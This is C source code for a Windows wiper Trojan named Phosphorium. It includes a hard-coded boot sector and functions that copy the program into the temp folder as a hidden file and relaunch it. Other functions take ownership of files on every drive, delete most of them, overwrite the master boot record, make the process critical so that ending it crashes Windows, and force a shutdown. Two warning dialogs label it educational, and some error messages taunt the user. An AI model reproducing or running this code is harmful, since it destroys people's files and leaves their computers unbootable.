#include "phosphorium.h"

CONST CHAR pccBootloader[512] = {
	0xB8, 0x13, 0x00, 0xCD, 0x10, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0x83, 0x36,
	0x56, 0x7C, 0x00, 0x31, 0xD2, 0x31, 0xC9, 0x89, 0xC8, 0x2D, 0xA0, 0x00,
	0x0F, 0xAF, 0xC0, 0x89, 0xD3, 0x83, 0xEB, 0x64, 0x0F, 0xAF, 0xDB, 0x01,
	0xD8, 0x03, 0x06, 0x56, 0x7C, 0x89, 0xC6, 0xC1, 0xEE, 0x05, 0x81, 0xE6,
	0xFF, 0x00, 0x89, 0xD7, 0x69, 0xFF, 0x40, 0x01, 0x01, 0xCF, 0x26, 0x89,
	0x35, 0x41, 0x81, 0xF9, 0x40, 0x01, 0x7C, 0xCF, 0x42, 0x81, 0xFA, 0xC8,
	0x00, 0x7C, 0xC6, 0xB9, 0xFF, 0xFF, 0xE2, 0xFE, 0xFF, 0x06, 0x56, 0x7C,
	0xEB, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

BOOL
WINAPI
ExecuteMalwareDropper(VOID)
{
	WCHAR szPath[MAX_PATH] = { 0 };
	WCHAR szNewPath[MAX_PATH] = { 0 };

	WCHAR szFileName[17] = { 0 };
	STARTUPINFO si = { sizeof(si) };

	PROCESS_INFORMATION pi = { 0 };
	DWORD dwUnnamed;
	HANDLE hFile;

	GetModuleFileNameW(NULL, szPath, MAX_PATH);

retry:
	GetTempPathW(MAX_PATH, szNewPath);

	if (wcsncmp(szPath, szNewPath, wcslen(szNewPath)))
	{
		GetRandPath(szFileName, 16);
		wcscat_s(szNewPath, MAX_PATH, szFileName);
		wcscat_s(szNewPath, MAX_PATH, L".txt");

		hFile = CreateFileW(szNewPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);

		if (hFile == INVALID_HANDLE_VALUE)
		{
			RtlZeroMemory(szNewPath, MAX_PATH);
			goto retry;
		}

		while (!WriteFile(hFile, szPath, MAX_PATH, &dwUnnamed, NULL))
		{
			Sleep(10);
		}

		CloseHandle(hFile);

		GetTempPathW(MAX_PATH, szNewPath);
		wcscat_s(szNewPath, MAX_PATH, szFileName);
		wcscat_s(szNewPath, MAX_PATH, L".exe");

		while (!CopyFileW(szPath, szNewPath, FALSE))
		{
			Sleep(10);
		}

		while (!SetFileAttributesW(szNewPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM))
		{
			Sleep(10);
		}

		CreateProcessW(szNewPath, NULL, NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, &si, &pi);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);

		return FALSE;
	}

	*wcsrchr(szPath, L'.') = 0;
	wcscat_s(szPath, MAX_PATH, L".txt");

	while ((hFile = CreateFileW(szPath, GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL)) == INVALID_HANDLE_VALUE)
	{
		Sleep(10);
	}

	while (!ReadFile(hFile, szNewPath, MAX_PATH, &dwUnnamed, NULL))
	{
		Sleep(10);
	}

	CloseHandle(hFile);

	while (!DeleteFileW(szPath))
	{
		Sleep(10);
	}

	while (!DeleteFileW(szNewPath))
	{
		Sleep(10);
	}

	if (MessageBoxW(NULL, L"WARNING!\n\nYou have just executed a Trojan known as Phosphorium.exe.\nIt is capable of completely wiping your operating system and personal files. including data in any other drives connected to your computer.\nThis program was not made to harm real computers, but is rather created for educational and demonstration purposes.\n\nThe creator sixtyfour64 is not responsible for or liable for any damage caused by Phosphorium.exe, there for you are warned two times before execution.\nPlease do not run it on property you do not own, only on your own machine and preferably on a virtual machine with no important data.\nProceed at your own risk.", L"Phosphorium.exe - Malware warning", MB_ICONWARNING | MB_YESNO | MB_SYSTEMMODAL | MB_DEFBUTTON2) != IDYES)
		return FALSE;

	if (MessageBoxW(NULL, L"FINAL WARNING!\nPhosphorium is fully capable of doing unrecoverable harm to your device, and you will lose all your data if you continue.\nThis is the final warning before execution.\n\nPrevious warning:\nYou have just executed a Trojan known as Phosphorium.exe.\nIt is capable of completely wiping your operating system and personal files. including data in any other drives connected to your computer.\nThis program was not made to harm real computers, but is rather created for educational and demonstration purposes.\n\nThe creator sixtyfour64 is not responsible for or liable for any damage caused by Phosphorium.exe, there for you are warned two times before execution.\nPlease do not run it on property you do not own, only on your own machine and preferably on a virtual machine with no important data.\nProceed at your own risk.\n\nAre you sure you want to continue?", L"''I warned you.''", MB_ICONWARNING | MB_YESNO | MB_SYSTEMMODAL | MB_DEFBUTTON2) != IDYES)
		return FALSE;

	return TRUE;
}

BOOL
WINAPI
SetPriv(
	_In_ HANDLE hToken,
	_In_ LPCWSTR lpwPrivilege,
	_In_ BOOL blEnablePrivilege
)
{
	TOKEN_PRIVILEGES tokenPriv;
	LUID luid;

	if (!LookupPrivilegeValueW(NULL, lpwPrivilege, &luid))
	{
		return FALSE;
	}

	tokenPriv.PrivilegeCount = 1;
	tokenPriv.Privileges[0].Luid = luid;

	tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	tokenPriv.Privileges[0].Attributes = 0;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) 
	{
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		return FALSE;
	}

	return TRUE;
}

BOOL
WINAPI
TakeOwnership(
	_In_ LPCWSTR lpwFile
)
{
	BOOL blRetval = FALSE;
	HANDLE hToken = NULL;
	PSID pSIDAdministrator = NULL, pSIDEverybody = NULL;

	PACL pACL = NULL;
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY, SIDAuthNT = SECURITY_NT_AUTHORITY;
	EXPLICIT_ACCESS explicitAccess[NUM_ACES] = { 0 };

	DWORD dwResources;
	if (!AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pSIDEverybody))
	{
		goto cleanup;
	}

	explicitAccess[0].grfAccessPermissions = GENERIC_ALL;
	explicitAccess[0].grfAccessMode = SET_ACCESS;
	explicitAccess[0].grfInheritance = NO_INHERITANCE;
	explicitAccess[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
	explicitAccess[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
	explicitAccess[0].Trustee.ptstrName = (LPCWSTR)pSIDEverybody;

	explicitAccess[1].grfAccessPermissions = GENERIC_ALL;
	explicitAccess[1].grfAccessMode = SET_ACCESS;
	explicitAccess[1].grfInheritance = NO_INHERITANCE;
	explicitAccess[1].Trustee.TrusteeForm = TRUSTEE_IS_SID;
	explicitAccess[1].Trustee.TrusteeType = TRUSTEE_IS_GROUP;
	explicitAccess[1].Trustee.ptstrName = (LPCWSTR)pSIDAdministrator;

	if (SetEntriesInAclW(NUM_ACES, explicitAccess, NULL, &pACL) != ERROR_SUCCESS)
	{
		goto cleanup;
	}

	dwResources = SetNamedSecurityInfoW(lpwFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL);

	if (dwResources == ERROR_SUCCESS)
	{
		blRetval = TRUE;
		goto cleanup;
	}

	if (dwResources != ERROR_ACCESS_DENIED)
	{
		goto cleanup;
	}

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		goto cleanup;
	}

	if (!SetPriv(hToken, SE_TAKE_OWNERSHIP_NAME, TRUE))
	{
		goto cleanup;
	}

	dwResources = SetNamedSecurityInfoW(lpwFile, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION, pSIDAdministrator, NULL, NULL, NULL);

	if (dwResources != ERROR_SUCCESS)
	{
		goto cleanup;
	}

	if (!SetPriv(hToken, SE_TAKE_OWNERSHIP_NAME, FALSE))
	{
		goto cleanup;
	}

	dwResources = SetNamedSecurityInfoW(lpwFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL);

	if (dwResources == ERROR_SUCCESS)
	{
		blRetval = TRUE;
	}

cleanup:
	if (pSIDAdministrator) FreeSid(pSIDAdministrator);
	if (pSIDEverybody) FreeSid(pSIDEverybody);
	if (pACL) LocalFree(pACL);
	if (hToken) CloseHandle(hToken);

	return blRetval;
}

BOOL
WINAPI
OpenRandomFiles(
	_In_ LPCWSTR lpwDir
)
{
	TakeOwnership(lpwDir);

	WCHAR szSearch[MAX_PATH] = { 0 };
	lstrcpyW(szSearch, lpwDir);
	lstrcatW(szSearch, L"*.*");

	WIN32_FIND_DATA findFiles;
	HANDLE hFind = FindFirstFileW(szSearch, &findFiles);

	if (hFind == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	else do
	{
		if (!lstrcmpW(findFiles.cFileName, L".") || !lstrcmpW(findFiles.cFileName, L"..") ||
			findFiles.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT)
		{
			continue;
		}

		WCHAR szPath[MAX_PATH] = { 0 };
		lstrcpyW(szPath, lpwDir);
		lstrcatW(szPath, findFiles.cFileName);

		TakeOwnership(szPath);

		if (findFiles.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			lstrcatW(szPath, L"\\");
			OpenRandomFiles(szPath);
			RemoveDirectoryW(lpwDir);
		}

		else
		{
			if (Xorshift32() % 64)
			{
				DeleteFileW(szPath);
			}

			else
			{
				ShellExecuteW(NULL, L"open", szPath, NULL, lpwDir, SW_SHOW);
				Sleep(Xorshift32() % 2000);
			}
		}
	}

	while (FindNextFileW(hFind, &findFiles));
	FindClose(hFind);
	RemoveDirectoryW(lpwDir);

	return TRUE;
}

VOID
WINAPI
OpenRandomDrives(VOID)
{
	WCHAR wcDrives[512] = { 0 };
	DWORD dwGetDrives = GetLogicalDriveStringsW(512, wcDrives);

	CloseHandle(CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)OpenRandomFiles, wcDrives, 0, NULL));
	for (DWORD i = 0; i < dwGetDrives; i++)
	{
		if (!wcDrives[i])
		{
			CloseHandle(CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)OpenRandomFiles, wcDrives + (i + 1) * sizeof(WCHAR), 0, NULL));
		}
	}
}

BOOL
WINAPI
OverwriteBootRecord(VOID)
{
	DWORD dwWrittenBytes;
	HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	if (hDevice == INVALID_HANDLE_VALUE) {
		MessageBoxW(NULL, L"error: failed to open handle to your physical drive. you're worthless kid.", L"Phosphorium", MB_OK | MB_ICONERROR);
		return FALSE;
	}

	BOOL blCheck = WriteFile(hDevice, pccBootloader, 512, &dwWrittenBytes, NULL);

	if (!blCheck) {
		MessageBoxW(NULL, L"error: i do not know", L"Bro", MB_OK | MB_ICONERROR);
		CloseHandle(hDevice);
		return FALSE;
	}

	return TRUE;
}

BOOL
WINAPI
SetProcessAsCriticalProcess(VOID)
{
	NTSTATUS(NTAPI * RtlAdjustPrivilege)(ULONG ulPrivilege, BOOLEAN blEnable, BOOLEAN blCurrentThread, PBOOLEAN pblEnabled);
	NTSTATUS(NTAPI * RtlSetProcessIsCritical)(BOOLEAN blNew, PBOOLEAN pblOld, BOOLEAN blScb);

	NTSTATUS ntValue;
	BOOLEAN blUnused;

	HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
	RtlAdjustPrivilege = (PVOID)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
	RtlSetProcessIsCritical = (PVOID)GetProcAddress(hNtdll, "RtlSetProcessIsCritical");

	if (RtlAdjustPrivilege)
	{
		ntValue = RtlAdjustPrivilege(20 /* SeDebugPrivilege */, TRUE, FALSE, &blUnused);
		if (ntValue)
		{
			return FALSE;
		}
	}
	else
	{
		ExitProcess(0);
		return FALSE;
	}

	if (RtlSetProcessIsCritical)
	{
		ULONG ulBreakTermination = 1;
		ntValue = RtlSetProcessIsCritical(TRUE, NULL, FALSE);

		if (ntValue)
		{
			return FALSE;
		}
	}
	else
	{
		return FALSE;
	}

	return TRUE;
}

BOOL
WINAPI
ForceShutdownDevice(VOID)
{
	NTSTATUS(NTAPI * RtlAdjustPrivilege)(ULONG ulPrivilege, BOOLEAN blEnable, BOOLEAN blCurrentThread, PBOOLEAN pblEnabled);
	NTSTATUS(NTAPI * NtShutdownSystem)(SHUTDOWN_ACTION action);
	NTSTATUS(NTAPI * NtSetSystemPowerState)(POWER_ACTION systemAction, SYSTEM_POWER_STATE minSystemState, ULONG ulFlags);

	NTSTATUS ntValue;
	BOOLEAN blUnused;
	BOOL blSuccess;

	HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");

	RtlAdjustPrivilege = (PVOID)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
	NtSetSystemPowerState = (PVOID)GetProcAddress(hNtdll, "NtSetSystemPowerState");
	NtShutdownSystem = (PVOID)GetProcAddress(hNtdll, "NtShutdownSystem");

	if (RtlAdjustPrivilege)
	{
		ntValue = RtlAdjustPrivilege(19 /* SeShutdownPrivilege */, TRUE, FALSE, &blUnused);

		if (ntValue)
		{
			MessageBoxW(NULL, L"error: toes", L"Finale is overrated.", MB_OK | MB_ICONERROR);
			return FALSE;
		}
	}

	if (NtSetSystemPowerState)
	{
		ntValue = NtSetSystemPowerState(PowerActionShutdownOff, PowerSystemShutdown, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_POWER_SUPPLY);
		if (!ntValue)
		{
			return TRUE;
		}
	}

	if (NtShutdownSystem)
	{
		ntValue = NtShutdownSystem(ShutdownPowerOff);

		if (!ntValue)
		{
			return TRUE;
		}
	}

	blSuccess = ExitWindowsEx(EWX_POWEROFF, EWX_FORCE);

	if (!blSuccess)
	{
		MessageBoxW(NULL, L"error: thank you", L"Is it true that you are faking depression?", MB_OK | MB_ICONERROR);
		return FALSE;
	}

	return TRUE;
}